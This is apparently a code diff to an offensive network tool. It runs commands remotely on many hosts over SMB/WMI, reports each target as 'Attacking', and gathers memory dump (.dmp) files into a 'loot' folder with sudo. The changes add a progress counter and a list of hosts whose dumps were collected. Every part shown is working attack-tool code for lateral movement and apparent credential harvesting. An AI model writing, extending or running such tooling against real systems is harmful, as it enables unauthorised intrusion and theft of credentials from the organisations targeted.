@@ -6,6 +6,7 @@ import sys
 import cmd
 import time
 import nmap
+import glob
 import ntpath
 import socket
 import random
@@ -1302,7 +1303,7 @@ def auto_drive(addresses, domain):  # really helpful so you dont have to know wh
         exit(0)
 
 
-def mt_execute(ip):  # multithreading requires a function
+def mt_execute(ip, count):  # multithreading requires a function
     printnlog("{} Attacking {}".format(green_plus, ip))
     try:
         if options.method == 'wmiexec':
@@ -1316,6 +1317,8 @@ def mt_execute(ip):  # multithreading requires a function
                                options.share, 445, options.service_name, 'cmd')
             executer.run(ip, ip)
         printnlog("{} {}: Completed".format(green_plus, ip))
+        if count % options.threads == 0:
+            printnlog('{}[+]{} {}% Complete'.format(color_YELL, color_reset, str(round((count/len(addresses)) * 100, 2 ))))
     except Exception as e:
         if logging.getLogger().level == logging.DEBUG:
             import traceback
@@ -1323,6 +1326,8 @@ def mt_execute(ip):  # multithreading requires a function
             traceback.print_exc()
         lognoprint('{}: {}\n'.format(ip, str(e)))
         logging.error('{}: {}'.format(ip, str(e)))
+        if count % options.threads == 0:
+            printnlog('{}[+]{} {}% Complete'.format(color_YELL, color_reset, str(round((count/len(addresses)) * 100, 2 ))))
         pass
 
 def port445_check(interface_ip):
@@ -1607,11 +1612,13 @@ if __name__ == '__main__':
         printnlog('Total targets: {}'.format(len(addresses)))
         # multithreading yeah
         with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
+            count = 1
             for ip in addresses:
+
                 if options.localauth:
                     domain = ip
                 try:
-                    out = thread_exe.schedule(mt_execute, (ip,), timeout=options.timeout)
+                    out = thread_exe.schedule(mt_execute, (ip, count, ), timeout=options.timeout)
                 except Exception as e:
                     if logging.getLogger().level == logging.DEBUG:
                         import traceback
@@ -1623,6 +1630,8 @@ if __name__ == '__main__':
                 except KeyboardInterrupt as e:
                     continue
 
+                count += 1
+
         time.sleep(2)
         os.system("sudo mv /var/tmp/{} {}/loot/{}".format(share_name, cwd, timestamp))
 
@@ -1631,6 +1640,16 @@ if __name__ == '__main__':
 
         if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
             os.system('sudo rm {}/drives.txt'.format(cwd))
+
+        dumped_hosts = glob.glob('{}/loot/{}/*.dmp'.format(cwd, timestamp)) # gets a list of all the .dmp file names within the output dir
+        dumped_hosts_fin = []
+        for item in dumped_hosts:
+            dumped_hosts_fin.append(item[item.rfind('/')+1:item.rfind('.')]) # this substring should make the filename hostname-ip only
+        with open('{}/loot/{}/dumped_hosts.txt'.format(cwd, timestamp), 'w') as f: # writes the list to a file
+            for host in dumped_hosts_fin:
+                f.write(host + '\n')
+            f.close()
+
 
         if options.ap:
             printnlog("\n[parsing files]")
